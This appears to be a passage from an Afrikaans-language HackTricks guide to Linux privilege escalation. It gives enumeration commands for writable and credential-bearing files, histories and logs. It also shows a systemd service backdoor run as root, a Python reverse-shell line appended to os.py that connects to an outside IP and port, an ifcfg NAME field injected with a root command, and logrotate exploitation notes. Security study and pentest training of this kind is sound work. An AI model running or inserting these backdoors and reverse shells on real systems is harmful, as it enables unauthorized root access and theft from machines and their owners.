LET WEL: Op BSD-platforms word `/etc/passwd` gevind by `/etc/pwd.db` en `/etc/master.passwd`; ook is `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet kyk of jy kan **skryf in sommige sensitiewe lêers**. Byvoorbeeld, kan jy na 'n **dienskonfigurasielêer** skryf?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat** server uitvoer en jy kan **modify the Tomcat service configuration file inside /etc/systemd/,** kan jy die volgende lyne wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer dat tomcat begin word.

### Kontroleer vouers

Die volgende vouers kan rugsteunkopieë of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer dit.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Eienaardige Ligging/Owned lêers
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die laaste minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Verborge lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteunkopieë**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog 'n interessante hulpmiddel** wat jy hiervoor kan gebruik is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n open source-toepassing is om baie wagwoorde te onttrek wat op 'n plaaslike rekenaar vir Windows, Linux & Mac gestoor is.

### Loglêers

As jy logs kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die log is, hoe meer interessant sal dit waarskynlik wees.\
Ook kan sommige "**sleg**" gekonfigurede (backdoored?) **audit logs** jou toelaat om wagwoorde binne audit logs op te neem soos in hierdie pos uiteengesit: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees sal die groep** [**adm**](interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell-lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generiese Creds Soek/Regex

Jy moet ook na lêers kyk wat die woord "**password**" in hul **naam** of binne die **inhoud** bevat, en kyk ook vir IPs en e-posse in logs, of hashes regexps.\
Ek gaan nie hier lys hoe om al hierdie dinge te doen nie, maar as jy geïnteresseerd is kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform nagaan.

## Skryfbare lêers

### Python library hijacking

As jy weet van **waar** 'n python script gaan uitgevoer word en jy **kan in daardie gids skryf** of jy kan **modify python libraries**, kan jy die OS library wysig en 'n backdoor daarin sit (as jy kan skryf waar die python script gaan uitgevoer word, kopieer en plak die os.py library).

Om die **backdoor the library** te doen, voeg net aan die einde van die os.py library die volgende reël by (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate uitbuiting

'n Kwesbaarheid in `logrotate` laat gebruikers met **skryftoestemmings** op 'n log-lêer of sy ouer-gidse moontlik toe om verhoogde bevoegdhede te verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om permissies nie net in _/var/log_ na te gaan nie maar ook in enige gids waar log-rotasie toegepas word.

> [!TIP]
> Hierdie kwesbaarheid betref `logrotate` weergawe `3.18.0` en ouer

Meer gedetailleerde inligting oor die kwesbaarheid is te vinde op hierdie bladsy: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so wanneer jy vind dat jy logs kan wysig, kyk wie daardie logs bestuur en kyk of jy bevoegdhede kan verhoog deur die logs met symlinks te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwetsbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

As, om enige rede, 'n gebruiker in staat is om 'n `ifcf-<whatever>`-skrip na _/etc/sysconfig/network-scripts_ te **skryf** of 'n bestaande een te **aanpas**, is jou stelsel **pwned**.

Netwerkskripte, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindinge. Hulle lyk presies soos .INI files. Hulle word egter op Linux deur Network Manager (dispatcher.d) \~sourced\~.

In my geval word die `NAME=` attribuut in hierdie netwerkskripte nie korrek hanteer nie. As jy **wit/leë spasie in die naam het die stelsel probeer die deel na die wit/leë spasie uitvoer**. Dit beteken dat **alles na die eerste leë spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let wel die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, and rc.d**

Die gids `/etc/init.d` is die tuiste van **scripts** vir System V init (SysVinit), die **klassieke Linux diensbestuurstelsel**. Dit sluit scripts in om `start`, `stop`, `restart`, en soms `reload` dienste. Hierdie kan direk uitgevoer word of deur simboliese skakels gevind in `/etc/rc?.d/`. 'n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant is `/etc/init` geassosieer met **Upstart**, 'n nuwer **service management** wat deur Ubuntu geïntroduseer is, en wat konfigurasielêers vir diensbestuur gebruik. Ten spyte van die oorwisseling na Upstart, word SysVinit-scripts steeds langs Upstart-konfigurasies gebruik weens 'n versoenbaarheidslaag in Upstart.

**systemd** tree op as 'n moderne initialization en diensbestuurder, wat gevorderde funksies soos on-demand daemon starting, automount bestuur, en stelseltoestand-opnames bied. Dit organiseer lêers in `/usr/lib/systemd/` vir distribusiepakkette en `/etc/systemd/system/` vir administrateur-wysigings, wat die stelseladministrasieproses vereenvoudig.

## Ander truuks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ontsnap uit beperkte Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks koppel gewoonlik 'n syscall om bevoorregte kernel-funksionaliteit aan 'n userspace manager bloot te lê. Swak manager-authentisering (bv. signature checks gebaseer op FD-order of swak wagwoordskemas) kan 'n plaaslike app toelaat om as die manager voor te doen en na root te eskaleer op reeds-geroote toestelle. Leer meer en sien uitbuitingsbesonderhede hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gedrewe service discovery in VMware Tools/Aria Operations kan 'n binêre pad uit proses-opdraglyne onttrek en dit met -v onder 'n bevoorregte konteks uitvoer. Permissiewe patrone (bv. die gebruik van \S) kan by aanvaller-geplaasde luisteraars in skryfbare lokasies (bv. /tmp/httpd) pas, wat tot uitvoering as root lei (CWE-426 Untrusted Search Path).

Lees meer en sien 'n gegeneraliseerde patroon toepaslik op ander discovery/monitoring stacks hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel sekuriteitsbeskerming

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Beste gereedskap om na Linux plaaslike privilege escalation-vektore te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Reken kernel-vulns uit in linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Verwysings

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
